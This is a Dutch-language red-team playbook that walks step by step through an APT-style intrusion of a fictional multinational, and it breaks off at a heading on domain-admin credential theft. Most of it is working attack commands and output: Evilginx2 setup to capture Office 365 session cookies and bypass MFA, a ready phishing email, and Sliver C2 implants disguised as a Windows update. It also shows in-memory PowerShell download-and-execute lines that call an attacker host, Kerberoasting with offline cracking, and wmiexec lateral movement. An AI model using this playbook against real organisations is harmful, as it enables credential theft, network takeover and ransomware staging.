# XPOSE SECURITY — APT CAMPAIGN PLAYBOOK
## Complete Aanval van Begin tot Einde

**Classificatie:** STRIKT VERTROUWELIJK — SENIOR OPERATOR  
**Versie:** 1.0 | Januari 2026  
**Doel:** Eén complete APT-style aanval van A tot Z

---

# WAT DIT DOCUMENT IS

Dit is **GEEN** lijst van technieken.  
Dit is **ÉÉN COMPLETE AANVAL** uitgeschreven alsof je het daadwerkelijk uitvoert.

**Scenario:** Een fictieve multinational "EuroTech Industries" - producent van industriële componenten met kantoren in België, Duitsland en Nederland. 2.500 werknemers, €500M omzet.

**Opdracht:** Full-scope Red Team assessment. Doel: Aantonen dat ransomware deployment mogelijk zou zijn geweest.

**STOP-moment:** We stoppen VOORDAT we daadwerkelijke schade aanrichten. We documenteren exact waar en hoe ransomware had kunnen worden gedeployed.

---

# FASE 0: CAMPAGNE PLANNING

## 0.1 Wat We Gaan Doen

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        APT CAMPAIGN TIMELINE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  WEEK 1          WEEK 2          WEEK 3          WEEK 4                     │
│  ┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐               │
│  │  OSINT  │────►│INFRA    │────►│ INITIAL │────►│INTERNAL │               │
│  │  RECON  │     │ SETUP   │     │ ACCESS  │     │  RECON  │               │
│  └─────────┘     └─────────┘     └─────────┘     └─────────┘               │
│       │               │               │               │                     │
│       ▼               ▼               ▼               ▼                     │
│  • Targets        • Domain        • Phishing     • BloodHound              │
│  • Email format   • C2 server     • Payload      • Credentials             │
│  • Tech stack     • Evilginx2     • Execution    • Lateral targets         │
│                                                                             │
│  WEEK 5          WEEK 6          WEEK 7          WEEK 8                     │
│  ┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐               │
│  │PRIVILEGE│────►│ LATERAL │────►│ DOMAIN  │────►│  STOP   │               │
│  │  ESCAL  │     │MOVEMENT │     │ DOMINAT │     │  POINT  │               │
│  └─────────┘     └─────────┘     └─────────┘     └─────────┘               │
│       │               │               │               │                     │
│       ▼               ▼               ▼               ▼                     │
│  • Local admin    • Spread        • DC access    • "Ransomware             │
│  • Persistence    • More creds    • Golden Tkt   •  could be               │
│                   • High-value    • Full control •  deployed here"         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 0.2 Ons Doel Definiëren

**Primair Doel:** Aantonen dat we ransomware hadden kunnen deployen op alle Windows systemen.

**Dit betekent concreet:**
1. Domain Admin credentials verkrijgen
2. Toegang tot Domain Controller(s)
3. Ability om GPO te pushen naar alle systemen
4. Documenteren: "Op dit moment, met deze toegang, hadden we ransomware kunnen deployen via GPO naar alle 2.500 endpoints"

**We doen NIET:**
- Daadwerkelijk ransomware deployen
- Daadwerkelijke encryptie
- Productie systemen verstoren
- Data exfiltreren (alleen bewijzen dat het KAN)

---

## 0.3 ROE Check

Voordat we beginnen, verify:

```
☑ Getekende ROE met scope: alle EuroTech domeinen en IP ranges
☑ Out-of-scope: OT/SCADA netwerk (apart geïsoleerd)
☑ Emergency contact: CISO (+31 6 xxx) - 24/7
☑ Get-out-of-jail letter voor physical (indien nodig)
☑ Deconfliction: Security team weet dat test loopt, maar niet wanneer/hoe
☑ Data handling: Geen echte data exfiltreren, alleen hashes voor crack
```

---

# FASE 1: OSINT & RECONNAISSANCE

## 1.1 Doelwit Profilering

**Eerste stap: Begrijp de organisatie voordat je iets technisch doet.**

### Bedrijfsinformatie Verzamelen

```
Google searches:
• "EuroTech Industries" site:linkedin.com
• "EuroTech" filetype:pdf
• "@eurotech.eu" (email format discovery)
• "eurotech.eu" site:github.com (leaked code/configs?)
```

> **📘 WAT WE ZOEKEN:**
> - Email format: voornaam.achternaam@eurotech.eu? v.achternaam? initialen?
> - Key mensen: CEO, CFO, CISO, IT Director, HR
> - Technologie hints: "We use Microsoft 365", "SAP implementation"
> - Recente events: Overnames, ontslagen, nieuwe kantoren
> - Organisatiestructuur: Wie rapporteert aan wie

### LinkedIn Deep Dive

```
LinkedIn searches:
• "EuroTech Industries" → People tab
• Filter: IT, Security, System Administrator
• Note: Names, titles, profile photos
• Look for: Recent job changes, complaints, engagement
```

> **📘 WAAROM LINKEDIN:**
> - IT beheerders = phishing targets (hebben admin rechten)
> - Nieuwe medewerkers = minder security awareness
> - HR/Recruitment = verwachten bijlagen (CV's)
> - Finance = verwachten facturen

**Output van LinkedIn recon:**

| Naam | Functie | Notities |
|------|---------|----------|
| Jan de Vries | IT Director | 15 jaar bij bedrijf, post over "cloud migration" |
| Maria Schmidt | Sr. Sysadmin | Recent promoted, actief op LinkedIn |
| Peter Bakker | HR Manager | Post veel vacatures, verwacht CV's |
| Anna Müller | Finance Controller | Factuurverwerking, SAP mentioned |

### Email Format Validatie

```bash
# Methode 1: Hunter.io
# Zoek eurotech.eu → toont email format + verified emails

# Methode 2: Handmatige check
# LinkedIn: Jan de Vries
# Probeer: jan.devries@eurotech.eu, j.devries@eurotech.eu, jdevries@eurotech.eu

# Methode 3: Email verification
# Tool: verify-email.org of emailhippo.com
# Test gevonden format met bekende naam
```

> **📘 EMAIL FORMAT IS KRITIEK:**
> - Verkeerd format = phishing faalt direct
> - Meeste bedrijven: voornaam.achternaam@domain
> - Sommige: eerste letter + achternaam
> - Enterprise: soms employee ID

**Resultaat:** Email format = voornaam.achternaam@eurotech.eu

---

## 1.2 Technische Reconnaissance

### DNS & Subdomain Enumeration

```bash
# Subdomain discovery
subfinder -d eurotech.eu -o subdomains.txt
amass enum -d eurotech.eu -o amass_subs.txt

# Combineer en deduplicate
cat subdomains.txt amass_subs.txt | sort -u > all_subs.txt
```

> **📘 WAT SUBDOMAINS ONS VERTELLEN:**
> - mail.eurotech.eu → Email server (Exchange? O365?)
> - vpn.eurotech.eu → VPN endpoint (Cisco? Fortinet? OpenVPN?)
> - owa.eurotech.eu → Outlook Web Access (Exchange on-prem)
> - remote.eurotech.eu → Remote access portal
> - dev.eurotech.eu → Development (vaak minder beveiligd)
> - legacy.eurotech.eu → Oude systemen (vaak kwetsbaar)

**Gevonden subdomains:**
```
mail.eurotech.eu        → MX record, Microsoft 365
autodiscover.eurotech.eu → Exchange autodiscover
vpn.eurotech.eu         → Cisco AnyConnect portal  
remote.eurotech.eu      → Citrix Gateway
intranet.eurotech.eu    → SharePoint
sap.eurotech.eu         → SAP portal
dev.eurotech.eu         → Development server
```

### Technology Stack Identificatie

```bash
# Wat draait op de webserver?
whatweb https://www.eurotech.eu
wappalyzer (browser extension)

# Email security check
dig eurotech.eu MX
dig eurotech.eu TXT  # SPF record
dig _dmarc.eurotech.eu TXT  # DMARC
```

> **📘 WAT DIT ONTHULT:**
> - MX naar Microsoft = Office 365 (Evilginx2 O365 phishlet)
> - SPF "include:spf.protection.outlook.com" = bevestigt O365
> - DMARC p=none = kunnen emails spoofen!
> - DMARC p=reject = moeten lookalike domain gebruiken

**Technology Stack Resultaat:**
```
Email:           Microsoft 365
Identity:        Azure AD (SSO)
VPN:             Cisco AnyConnect  
Remote Access:   Citrix
File Storage:    SharePoint/OneDrive
ERP:             SAP
Endpoints:       Windows 10/11 (LinkedIn posts bevestigen)
```

### Credential Leak Check

```bash
# Check voor gelekte credentials
# Tools: DeHashed, LeakCheck, HaveIBeenPwned (API)

# Zoek op domain
dehashed-cli search "eurotech.eu"

# Output voorbeeld:
# jan.devries@eurotech.eu:Summer2023!
# m.schmidt@eurotech.eu:Welcome123
# p.bakker@eurotech.eu:EuroTech2022
```

> **📘 GELEKTE CREDENTIALS:**
> - Test NIET direct op productie (detectie!)
> - Mensen hergebruiken wachtwoorden
> - Wachtwoord patterns leren: "Summer2023" → probeer "Winter2024"
> - Bewaar voor later: password spray na phishing faalt

**Credential Leaks Gevonden:**
- 3 emails met wachtwoorden uit 2022 breach
- Pattern: Seizoen + Jaar + Special char
- Bewaren voor password spray

---

## 1.3 Target Selectie voor Phishing

Op basis van OSINT selecteren we targets:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    PHISHING TARGET PRIORITEIT                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  TIER 1 (Hoogste kans + hoogste waarde):                                    │
│  ├── IT Support medewerkers (admin credentials, verwachten tickets)         │
│  ├── HR Recruitment (verwachten CV's, bijlagen normaal)                     │
│  └── Finance/AP (verwachten facturen, bijlagen normaal)                     │
│                                                                             │
│  TIER 2 (Goede kans):                                                       │
│  ├── Nieuwe medewerkers (<6 maanden, minder awareness)                      │
│  ├── Sales team (externe communicatie normaal)                              │
│  └── Executive assistants (namens executives, veel email)                   │
│                                                                             │
│  TIER 3 (Moeilijker maar hoge waarde):                                      │
│  ├── IT Administrators (hoge waarde, maar security aware)                   │
│  ├── Executives (hoge waarde, maar mogelijk extra beschermd)                │
│  └── Security team (DO NOT TARGET - deconfliction)                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Geselecteerde Primaire Targets:**

| Naam | Email | Rol | Waarom |
|------|-------|-----|--------|
| Peter Bakker | peter.bakker@eurotech.eu | HR Manager | Verwacht CV's |
| Anna Müller | anna.muller@eurotech.eu | Finance | Verwacht facturen |
| Thomas Klein | thomas.klein@eurotech.eu | IT Support | Verwacht tickets, heeft admin |
| Lisa Jansen | lisa.jansen@eurotech.eu | New Hire (2 maanden) | Minder awareness |

---

# FASE 2: INFRASTRUCTURE SETUP

## 2.1 Domain Aankoop & Aging

We kopen een lookalike domain WEKEN voordat we aanvallen.

```
Target domain:    eurotech.eu
Lookalike opties:
• eur0tech.eu        (0 vs o)
• eurotech-hr.eu     (afkorting toevoegen)
• eurotech.co        (andere TLD)
• eurotechi.eu       (extra letter)
• euretech.eu        (letter swap)
```

> **📘 DOMAIN SELECTIE CRITERIA:**
> - Visueel lijkend in email client
> - Niet al geregistreerd
> - Niet op blacklists
> - TLD die vertrouwd lijkt (.eu, .com, .nl)

**Gekozen domain:** eurotech-hr.eu  
**Reden:** HR context voor CV phishing, ziet er legitiem uit

```bash
# Domain registreren (Namecheap, via privacy service)
# Gebruik anonieme betaling indien mogelijk
# Registreer 2-4 weken VOOR de aanval

# Na registratie:
# 1. Zet basis website op (kopie van eurotech.eu about page)
# 2. Configureer SPF, DKIM, DMARC
# 3. Stuur test emails om reputation te bouwen
# 4. Laat "aged" worden
```

### Domain Aging Proces

```bash
# Week 1-2: Setup
# Configureer DNS records:
eurotech-hr.eu    A       → VPS IP (voor website)
mail.eurotech-hr.eu A     → Mail server IP
eurotech-hr.eu    MX      → mail.eurotech-hr.eu
eurotech-hr.eu    TXT     → "v=spf1 ip4:x.x.x.x -all"
_dmarc.eurotech-hr.eu TXT → "v=DMARC1; p=none"

# Week 2-4: Reputation building
# Stuur legitieme emails naar:
# - Je eigen accounts
# - Spamtraps (controlled)
# - Nieuwsbrieven aanmelden
# Dit bouwt "goede" verzendreputatie
```

> **📘 WAAROM DOMAIN AGING:**
> - Nieuwe domains worden geflagged
> - Email providers checken domain leeftijd
> - 2-4 weken aging = significant betere deliverability
> - Zonder aging: 50%+ gaat naar spam

---

## 2.2 Evilginx2 Setup (Credential Harvesting)

We gebruiken Evilginx2 om O365 credentials + MFA tokens te harvesten.

```bash
# Op VPS (vers, dedicated IP)
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./bin/evilginx -p ./phishlets

# Configureer domain
config domain eurotech-hr.eu
config ip x.x.x.x

# Laad O365 phishlet
phishlets hostname o365 login.eurotech-hr.eu
phishlets enable o365
```

> **📘 WAT EVILGINX2 DOET:**
> - Zet zich tussen slachtoffer en echte O365
> - Slachtoffer ziet echte Microsoft login (geproxied)
> - Wij vangen credentials EN session cookie
> - MFA wordt ook geproxied → wij krijgen authenticated session

```bash
# Maak phishing lure
lures create o365
lures get-url 0

# Output: https://login.eurotech-hr.eu/xxxxxxxx
# Dit is onze phishing URL
```

### Test de Setup

```bash
# ALTIJD TESTEN voor de echte aanval

# 1. Open URL in incognito browser
# 2. Controleer dat het er legitiem uitziet
# 3. Login met test account
# 4. Controleer dat credentials + session worden gevangen

# In Evilginx2 console:
sessions
sessions 1  # Bekijk gevangen session

# Je zou moeten zien:
# - Username
# - Password  
# - Session cookie (dit is de gouden vondst!)
```

> **📘 SESSION COOKIE = MFA BYPASS:**
> - Met alleen username + password kun je niet in als MFA aan staat
> - Met session cookie ben je AL authenticated
> - Cookie importeren in browser = je bent ingelogd als slachtoffer

---

## 2.3 Command & Control Setup

We hebben C2 nodig voor als we binnen zijn.

```bash
# Optie 1: Sliver (open source, modern)
# Optie 2: Cobalt Strike (commercieel, gold standard)
# Optie 3: Havoc (open source alternatief)

# Voor deze campagne: Sliver

# Install Sliver op C2 server (APARTE server van phishing!)
curl https://sliver.sh/install | sudo bash
sliver-server

# Genereer implant
generate --mtls c2.eurotech-hr.eu:443 --save /opt/implants/

# Start listener
mtls --lhost 0.0.0.0 --lport 443
```

> **📘 C2 ARCHITECTURE:**
> ```
> Phishing Server (login.eurotech-hr.eu)
>        ↓
> Slachtoffer klikt → credentials gevangen
>        ↓
> Payload wordt gedownload van andere server
>        ↓
> C2 Server (c2.eurotech-hr.eu) ← Implant connect back
> ```
>
> **Waarom aparte servers:**
> - Als phishing gedetecteerd wordt, blijft C2 intact
> - Verschillende IP reputaties
> - Betere OPSEC

### Payload Generatie

```bash
# Sliver implant met evasie
generate --mtls c2.eurotech-hr.eu:443 \
         --os windows \
         --arch amd64 \
         --format exe \
         --name Windows_Update \
         --save /opt/implants/update.exe

# Of als shellcode voor custom loader:
generate --mtls c2.eurotech-hr.eu:443 \
         --os windows \
         --arch amd64 \
         --format shellcode \
         --save /opt/implants/payload.bin
```

> **📘 PAYLOAD OPSEC:**
> - Genereer vlak voor gebruik (voorkomt signature matching)
> - Gebruik unieke naam per target
> - Test tegen VirusTotal NIET met finale payload
> - Test lokaal in lab met target's AV

---

# FASE 3: INITIAL ACCESS

## 3.1 Phishing Campagne Uitvoering

Nu voeren we de daadwerkelijke aanval uit.

### Email Crafting

```
Van:      recruitment@eurotech-hr.eu
Aan:      peter.bakker@eurotech.eu
Onderwerp: Sollicitatie Senior IT Engineer - Ter review

Beste Peter,

Bijgevoegd vind je de sollicitatie van kandidaat Michael Weber 
voor de positie Senior IT Engineer.

Gezien zijn ervaring bij Siemens lijkt hij een sterke match. 
Kun je zijn LinkedIn profiel reviewen via onderstaande link 
en je eerste indruk delen?

Kandidaat profiel: [Review LinkedIn Profile]

Met vriendelijke groet,

Sandra Visser
HR Recruitment
EuroTech Industries

--
Dit bericht is vertrouwelijk en alleen bedoeld voor de geadresseerde.
```

> **📘 WAAROM DIT WERKT:**
> - **Legitieme context:** HR manager verwacht dit type email
> - **Urgentie:** "Sterke match" impliceert snelle actie
> - **Call-to-action:** Duidelijke vraag om te klikken
> - **Signature:** Professioneel, met disclaimer
> - **Geen bijlage:** Link is minder verdacht dan .exe

```
[Review LinkedIn Profile] → https://login.eurotech-hr.eu/xxxxxxxx
```

### Verzending Timing

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    OPTIMALE VERZENDTIJDEN                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  BESTE DAGEN:    Dinsdag, Woensdag, Donderdag                               │
│  BESTE TIJD:     09:30 - 11:00 of 14:00 - 15:30                             │
│                                                                             │
│  WAAROM:                                                                    │
│  • Maandag: mensen verwerken weekend backlog                                │
│  • Vrijdag: mensen zijn al in weekend-modus                                 │
│  • Ochtend: fris, nog niet overweldigd                                      │
│  • Na lunch: tweede productieve periode                                     │
│                                                                             │
│  VERMIJD:                                                                   │
│  • Voor 08:00 (valt op)                                                     │
│  • Na 18:00 (valt op)                                                       │
│  • Weekenden                                                                │
│  • Feestdagen                                                               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Campagne Uitrol

```bash
# Staggered verzending (niet alles tegelijk!)
# Dit voorkomt bulk email detectie

# Wave 1: Dinsdag 09:30 - Peter Bakker (HR)
# Wave 2: Dinsdag 14:15 - Anna Müller (Finance, andere pretext)
# Wave 3: Woensdag 10:00 - Thomas Klein (IT Support)
# Wave 4: Woensdag 14:45 - Lisa Jansen (New hire)
```

---

## 3.2 Credential Capture & Session Hijack

Peter klikt. We zien het in Evilginx2.

```bash
# Evilginx2 console
: sessions

┌─────────────────────────────────────────────────────────────────────────────┐
│ ID │ PHISHLET │ USERNAME              │ CAPTURED      │ TOKENS │           │
├────┼──────────┼───────────────────────┼───────────────┼────────┼───────────┤
│ 1  │ o365     │ peter.bakker@eurotech │ 2026-01-15    │ YES    │ VALID     │
└────┴──────────┴───────────────────────┴───────────────┴────────┴───────────┘

: sessions 1

[Session Details]
Username:    peter.bakker@eurotech.eu
Password:    EuroTech2024!
User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Remote IP:   86.83.xxx.xxx (KPN Netherlands)
Captured:    2026-01-15 09:47:23 UTC

[Tokens]
Cookie: ESTSAUTH=0.AQUAx...
Cookie: ESTSAUTHPERSISTENT=0.AQUAx...

[!] Session cookies captured - MFA BYPASSED
```

> **📘 WAT WE NU HEBBEN:**
> - **Username:** peter.bakker@eurotech.eu
> - **Password:** EuroTech2024!
> - **Session Cookie:** Authenticated O365 session
>
> **De session cookie betekent:**
> - MFA is al gepasseerd
> - We kunnen direct in zijn O365
> - Geen extra authenticatie nodig

### Session Import in Browser

```bash
# Exporteer cookie vanuit Evilginx2
: sessions 1 cookie

# Output: JSON met alle cookies

# In browser (Firefox/Chrome):
# 1. Install "Cookie Editor" extension
# 2. Ga naar https://outlook.office365.com
# 3. Import cookies
# 4. Refresh pagina
# 5. Je bent nu ingelogd als Peter Bakker
```

> **📘 NU HEBBEN WE:**
> - Toegang tot Peter's email
> - Toegang tot Peter's OneDrive
> - Toegang tot Peter's SharePoint
> - Toegang tot Peter's Teams
> - En alles waar hij Single Sign-On voor heeft...

---

## 3.3 Mailbox Reconnaissance

We doorzoeken Peter's mailbox voor intel.

```
Zoektermen in Outlook:
• "wachtwoord" 
• "password"
• "credentials"
• "VPN"
• "admin"
• "server"
• "IP address"
• "IT helpdesk"
```

> **📘 WAT WE ZOEKEN:**
> - Interne systeem documentatie
> - Wachtwoorden in emails (ja, mensen doen dit)
> - IT support tickets met system info
> - Sharepoint links naar documentatie
> - Teams groepen waar we bij kunnen

**Gevonden in Peter's mailbox:**
```
1. Email van IT: "Je VPN account is gereset. Nieuw wachtwoord: Welkom2024!"
2. SharePoint link: "IT Documentatie" → netwerk diagrammen
3. Teams groep: "HR-IT-Support" → interne chat
4. Email: "Nieuwe laptop configuratie" → standaard software lijst
5. Attachment: "Onboarding_Checklist.xlsx" → system URLs, accounts
```

**GOUD:** We vinden een email met:
- VPN portal URL: vpn.eurotech.eu
- Peter's VPN username: P.Bakker
- Tijdelijk wachtwoord (nooit gewijzigd)

---

## 3.4 Initial Foothold via VPN

We gebruiken de VPN credentials om het interne netwerk te betreden.

```bash
# Connect naar Cisco AnyConnect VPN
# Username: P.Bakker
# Password: Welkom2024!
# MFA: We hebben nog steeds de O365 session → vaak zelfde MFA

# Na succesvolle connectie:
# We krijgen intern IP: 10.10.50.xxx
# We zijn nu "binnen" het netwerk
```

> **📘 VPN VS PAYLOAD:**
> We kozen VPN boven payload omdat:
> - Geen executable nodig op target systeem
> - Geen AV/EDR detectie risico
> - Legitieme connectie die elke dag voorkomt
> - Meer bewegingsvrijheid
>
> We kunnen later ALSNOG een implant droppen voor persistence

**Netwerk Positie:**
```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ONZE HUIDIGE POSITIE                                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  INTERNET ──────► VPN Gateway ──────► Corporate Network                     │
│                        │                      │                             │
│              [Wij zijn hier]          [We hebben toegang]                   │
│                        │                      │                             │
│                        ▼                      ▼                             │
│               10.10.50.xxx (ons IP)    10.10.0.0/16 (netwerk)               │
│                                                                             │
│  Rechten: Peter Bakker (HR Manager)                                         │
│  Niveau:  Standard Domain User                                              │
│  Doel:    Escaleren naar Domain Admin                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

# FASE 4: INTERNAL RECONNAISSANCE

## 4.1 Network Discovery

We zijn binnen. Nu moeten we het landschap begrijpen.

```bash
# Basis netwerk recon vanaf onze VPN sessie
# We openen PowerShell op onze aanvaller machine

# Eerst: Wat kunnen we bereiken?
ping 10.10.1.1     # Gateway?
ping 10.10.1.10    # DC? (vaak .10 of .1)
```

> **📘 VOORZICHTIG:**
> - Elke scan kan detectie triggeren
> - Begin PASSIEF, word pas actief als nodig
> - We hebben Peter's credentials, geen admin
> - Kijk eerst wat we kunnen zonder tools

### Active Directory Reconnaissance

```powershell
# Gebruik PowerShell - geen tools uploaden nodig
# Dit is NORMAAL gedrag voor domain user

# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Output:
# Name: eurotech.local
# DomainControllers: DC01.eurotech.local, DC02.eurotech.local
```

> **📘 WAT DIT ONS VERTELT:**
> - Domain naam: eurotech.local
> - Er zijn 2 Domain Controllers
> - DC01 en DC02 - beiden targets voor later

```powershell
# Zoek Domain Controllers (IP adressen)
nslookup eurotech.local
nslookup DC01.eurotech.local

# Output:
# DC01.eurotech.local → 10.10.1.10
# DC02.eurotech.local → 10.10.1.11
```

```powershell
# Zoek Domain Admins
net group "Domain Admins" /domain

# Output:
# Members:
# Administrator
# admin.jvries
# svc_backup
# admin.mschmidt
```

> **📘 WAARDEVOLLE INFO:**
> - **admin.jvries** - Waarschijnlijk Jan de Vries (IT Director van LinkedIn)
> - **admin.mschmidt** - Waarschijnlijk Maria Schmidt (Sr. Sysadmin van LinkedIn)
> - **svc_backup** - Service account! Mogelijk Kerberoastable

```powershell
# Wat zijn mijn groepen? (als Peter Bakker)
whoami /groups

# Output:
# EUROTECH\Domain Users
# EUROTECH\HR-Department
# EUROTECH\SharePoint-Users
# ...
```

---

## 4.2 BloodHound Data Collection

Nu gaan we het AD volledig mappen met BloodHound.

```powershell
# SharpHound uitvoeren (BloodHound collector)
# We moeten SharpHound naar het netwerk krijgen

# Optie 1: Download via PowerShell (kan gedetecteerd worden)
IEX(New-Object Net.WebClient).DownloadString('http://c2.eurotech-hr.eu/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\P.Bakker\Documents\

# Optie 2: Encode SharpHound en run in-memory
# Minder detectie, complexer
```

> **📘 BLOODHOUND COLLECTION METHODS:**
> - **All:** Alles verzamelen (luidst, meest compleet)
> - **DCOnly:** Alleen van DC (stiller, minder info)
> - **Session:** Actieve sessies (wie is waar ingelogd)
> - **LoggedOn:** Ingelogde users
>
> **We kiezen:** All - we willen complete picture

```
SharpHound Output:
20260115143022_BloodHound.zip
- computers.json (847 computers)
- users.json (2,341 users)
- groups.json (189 groups)
- domains.json
- sessions.json
- ous.json
```

### BloodHound Analyse

```
Importeer ZIP in BloodHound GUI
Voer queries uit:
```

**Query 1: Shortest Path to Domain Admin**
```
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@EUROTECH.LOCAL"})) 
WHERE u.name =~ "P.BAKKER.*" RETURN p
```

> **📘 RESULTAAT:**
> ```
> P.Bakker → HR-Department → Schrijfrechten op HR-Share → 
> HR-Share heeft GPO voor HR computers → 
> admin.mschmidt logt in op HR computers → 
> admin.mschmidt is Domain Admin
> ```
>
> **Interpretatie:** Als we op een HR computer komen, kunnen we 
> admin.mschmidt's credentials stelen als zij inlogt!

**Query 2: Kerberoastable Accounts**
```
MATCH (u:User {hasspn:true}) RETURN u.name
```

> **📘 RESULTAAT:**
> - svc_backup (Backup service)
> - svc_sql (SQL Server service)
> - svc_iis (IIS service)
>
> **Dit zijn service accounts met SPN - we kunnen hun tickets cracken!**

**Query 3: Waar loggen Domain Admins in?**
```
MATCH p=(u:User)-[:AdminTo]->(c:Computer) WHERE u.name =~ ".*ADMIN.*" RETURN p
```

> **📘 RESULTAAT:**
> - admin.jvries → YOURITSYS01, DC01, DC02
> - admin.mschmidt → YOURITSYS02, DC01, DC02, HR-PC-042
> - svc_backup → Scheduled task op alle servers
>
> **admin.mschmidt logt in op HR-PC-042!** Dit is ons pad.

---

## 4.3 Attack Path Planning

Op basis van BloodHound bepalen we ons pad naar Domain Admin:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    GEKOZEN ATTACK PATH                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  HUIDIGE POSITIE                                                            │
│  P.Bakker (HR Manager, standaard user)                                      │
│       │                                                                     │
│       ▼                                                                     │
│  STAP 1: Kerberoasting                                                      │
│  Target: svc_backup (service account)                                       │
│  Methode: Request TGS, crack offline                                        │
│       │                                                                     │
│       ▼                                                                     │
│  STAP 2: Lateral Movement naar server                                       │
│  svc_backup heeft admin op backup servers                                   │
│  Methode: Pass-the-Hash of gekraakt wachtwoord                              │
│       │                                                                     │
│       ▼                                                                     │
│  STAP 3: Credential Harvesting op server                                    │
│  Admin.mschmidt RDP't naar backup server voor checks                        │
│  Methode: LSASS dump wanneer zij inlogt                                     │
│       │                                                                     │
│       ▼                                                                     │
│  STAP 4: Domain Admin Access                                                │
│  admin.mschmidt is Domain Admin                                             │
│  Methode: Pass-the-Hash naar DC                                             │
│       │                                                                     │
│       ▼                                                                     │
│  STOP POINT: DCSync & Golden Ticket                                         │
│  Bewijs: We kunnen alle credentials dumpen                                  │
│  Bewijs: We kunnen GPO pushen = ransomware deployment mogelijk              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

# FASE 5: PRIVILEGE ESCALATION

## 5.1 Kerberoasting Attack

We beginnen met Kerberoasting - geen admin nodig.

```powershell
# Met Rubeus (in-memory)
$rubeus = (New-Object Net.WebClient).DownloadString('http://c2.eurotech-hr.eu/Rubeus.ps1')
IEX $rubeus
Invoke-Rubeus -Command "kerberoast /outfile:C:\Users\P.Bakker\Documents\hashes.txt"
```

> **📘 WAT KERBEROASTING DOET:**
> - Vraagt Kerberos ticket aan voor service accounts
> - Elk domain user mag dit doen (normaal!)
> - Ticket is encrypted met service account wachtwoord
> - We cracken het ticket OFFLINE

```bash
# Alternatief: Impacket vanaf onze machine (via VPN)
GetUserSPNs.py eurotech.local/P.Bakker:EuroTech2024! -dc-ip 10.10.1.10 -outputfile kerberoast.txt

# Output:
# $krb5tgs$23$*svc_backup$EUROTECH.LOCAL$...
# $krb5tgs$23$*svc_sql$EUROTECH.LOCAL$...
# $krb5tgs$23$*svc_iis$EUROTECH.LOCAL$...
```

> **📘 WAAROM IMPACKET BETER IS:**
> - Geen tool op target systeem
> - Minder detectie risico
> - Alles via netwerk (VPN)
> - Output direct op onze machine

### Offline Cracking

```bash
# Hashcat op onze krachtige machine
hashcat -m 13100 kerberoast.txt /opt/wordlists/rockyou.txt -r /opt/rules/best64.rule

# Na enkele uren...
# $krb5tgs$23$*svc_backup$EUROTECH.LOCAL$...:Backup2023!
```

> **📘 RESULTAAT:**
> - svc_backup wachtwoord: **Backup2023!**
> - svc_sql: Niet gekraakt (sterk wachtwoord)
> - svc_iis: Niet gekraakt
>
> **Eén is genoeg!** svc_backup heeft admin op backup servers.

---

## 5.2 Lateral Movement met Service Account

We gebruiken svc_backup om naar een server te bewegen.

```bash
# Check waar svc_backup admin is (BloodHound)
# → YOURBACKUP01, YOURBACKUP02, FILE01

# Test credentials
crackmapexec smb 10.10.5.20 -u svc_backup -p 'Backup2023!' --shares

# Output:
# SMB  10.10.5.20  YOURBACKUP01  [+] eurotech.local\svc_backup:Backup2023! (Admin!)
```

> **📘 WE HEBBEN:**
> - Admin toegang tot YOURBACKUP01
> - Via legitiem service account
> - Geen "hacking tools" detectie

```bash
# Get shell via WMIexec (geen service install zoals PsExec)
wmiexec.py eurotech.local/svc_backup:'Backup2023!'@10.10.5.20

# Output:
# [*] SMBv3.0 dialect used
# [!] Launching semi-interactive shell
# C:\>whoami
# eurotech\svc_backup
# C:\>hostname
# YOURBACKUP01
```

> **📘 NU ZIJN WE:**
> - Op YOURBACKUP01
> - Als svc_backup (local admin)
> - Klaar om credentials te harvesten

---

## 5.3 Persistence op Server

Voordat we verder gaan, zorgen we voor persistence.

```powershell
# Op YOURBACKUP01 als svc_backup
# Installeer Sliver implant voor stabiele toegang

# Download en execute implant
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://c2.eurotech-hr.eu/update.ps1')"
```

> **📘 WAAROM PERSISTENCE NU:**
> - VPN kan uitvallen
> - svc_backup wachtwoord kan veranderen
> - We willen stabiele toegang
> - Backup plan als iets mis gaat

```bash
# Op onze C2 server zien we de connectie
sliver > sessions

# ID   Transport  Remote Address      Hostname      Username
# 1    mtls       10.10.5.20:54321    YOURBACKUP01  svc_backup
```

---

## 5.4 Wachten op Domain Admin Login

Nu wachten we tot admin.mschmidt inlogt op deze server.

```powershell
# Monitoring script voor nieuwe logon sessions
while($true) {
    $sessions = query user 2>$null
    if($sessions -match "admin") {
        Write-Host "[!] ADMIN DETECTED!" -ForegroundColor Red
        $sessions
        break
    }
    Start-Sleep -Seconds 30
}
```

> **📘 WAT WE WACHTEN OP:**
> - admin.mschmidt logt in voor backup verificatie
> - Dit gebeurt volgens BloodHound data regelmatig
> - Zodra ze inlogt, zijn haar credentials in LSASS

**Na 2 dagen monitoring...**

```
[!] ADMIN DETECTED!
USERNAME      SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
admin.mschmidt rdp-tcp#5    3   Active  .          1/17/2026 09:15
svc_backup    services      0   Disc    3:42       1/15/2026 14:20
```

---

## 5.5 Domain Admin Credential Theft

